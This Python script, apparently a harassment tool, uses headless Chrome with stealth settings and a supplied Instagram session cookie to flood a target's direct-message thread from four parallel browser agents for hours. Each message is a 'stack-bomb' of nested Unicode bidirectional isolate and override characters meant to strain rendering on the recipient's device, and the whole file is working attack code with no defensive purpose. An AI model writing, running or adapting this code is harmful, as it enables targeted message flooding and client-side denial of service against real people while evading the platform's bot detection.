# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (HEAVY-MINIMAL V16)
# 📅 STATUS: MAX-RENDER-STRESS | 4-AGENT | DOCKER-READY

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CONFIGURATION ---
THREADS = 4             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.1)  # Overclocked speed
SESSION_LIMIT = 180       # Longer sessions for sustained pressure
REST_AFTER_STRIKES = 100   # 🔥 Rest every 100 messages
REST_DURATION = 5          # 🕒 5 Seconds cooldown

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_max_heavy_payload():
    """Generates a high-density recursive isolate block."""
    u_id = random.randint(100, 999)
    glue = "\u2060" # Word Joiner
    # FSI (First Strong Isolate) is the most taxing directional character
    iso = "\u2068" 
    pop = "\u2069"
    
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 [NODE_ID:{u_id}]"
    
    # 🏗️ THE 'STACK-BOMB'
    # We nest Isolates. This forces a recursive style calculation.
    body = []
    for i in range(220): # Increased density for 'Heavy' impact
        # Alternate direction overrides within the isolates
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        body.append(f"{iso}{prefix}\u2800{glue}{pop}")
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] M-{os.environ.get('MACHINE_ID')} Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        mobile_emulation = {
            "deviceMetrics": { "width": 360, "height": 640, "pixelRatio": 2.0 },
            "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        }
        chrome_options.add_experimental_option("mobileEmulation", mobile_emulation)
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"heavy_node_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Android", fix_hairline=True)
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_inject(driver, element, text):
    try:
        driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", element, text)
        element.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        session_start = time.time()
        strike_counter = 0 # Track strikes per agent session
        
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(8) 
            
            box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
            adaptive_inject(driver, box, "🔥 HEAVY MATRIX CONNECTED")

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_max_heavy_payload()
                if adaptive_inject(driver, box, payload):
                    strike_counter += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    
                    # 🕒 REST CYCLE LOGIC
                    if strike_counter % REST_AFTER_STRIKES == 0:
                        log_status(agent_id, f"✅ 100 Strikes Reached. Resting {REST_DURATION}s...")
                        time.sleep(REST_DURATION)
                    else:
                        log_status(agent_id, f"Hit {GLOBAL_SENT}")
                        
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            shutil.rmtree(getattr(driver, 'custom_temp_path', ''), ignore_errors=True)
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
